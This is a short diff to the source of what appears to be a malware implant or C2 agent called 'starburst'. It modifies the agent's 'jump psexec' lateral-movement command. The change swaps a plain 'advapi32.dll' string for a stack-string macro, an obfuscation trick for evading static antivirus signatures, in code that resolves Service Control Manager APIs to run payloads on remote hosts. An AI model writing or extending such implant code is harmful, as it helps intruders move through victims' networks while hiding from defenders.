@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_JUMP_PSEXEC
 
@@ -92,8 +93,8 @@ auto declfn starburst::cmd_jump_psexec(
     }
 
     // resolve SCM APIs
-    HMODULE h_advapi = inst.kernel32.LoadLibraryA(
-        symbol<char*>( const_cast<char*>( "advapi32.dll" ) ) );
+    STK_ADVAPI32(_n);
+    HMODULE h_advapi = inst.kernel32.LoadLibraryA( _n );
     if ( !h_advapi ) {
         inst.kernel32.DeleteFileW( w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
